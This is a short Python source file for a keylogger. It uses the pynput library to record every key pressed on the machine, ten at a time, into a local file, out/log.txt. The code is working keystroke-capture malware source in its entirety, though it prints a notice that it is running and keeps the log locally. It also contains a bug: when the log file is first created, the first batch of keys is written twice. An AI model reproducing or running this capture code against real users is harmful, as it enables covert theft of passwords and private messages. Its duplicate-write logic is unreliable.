from pynput.keyboard import Key, Listener
import os.path

keys = []
count = 0

# Handles key press events, logging any pressed keys, 10 keys at a time
def on_press(key):
    global keys, count
    #print (f"{key} pressed")

    keys.append(key)
    count += 1

    if count == 10:
        write_file(keys)
        count = 0
        keys = []

def on_release(key):
    pass

# Converts each key press into a string and appends to the output file, with spaces being converted into a new line
def write_file(keys):
    
    if (os.path.isfile("out/log.txt") != True):
        with open("out/log.txt", "x") as file:
            for key in keys:
                k = str(key).replace("'", "")
                if k == 'Key.space':
                    k = "\n"
                file.writelines(k)
         
    with open("out/log.txt", "a") as file:
         for key in keys:
            k = str(key).replace("'", "")
            if k == 'Key.space':
                 k = "\n"
            file.writelines(k)

if __name__ == "__main__":
    
    with Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        print("Key Logger is running\nPressing any key will append it to out/log.txt")
        listener.join()


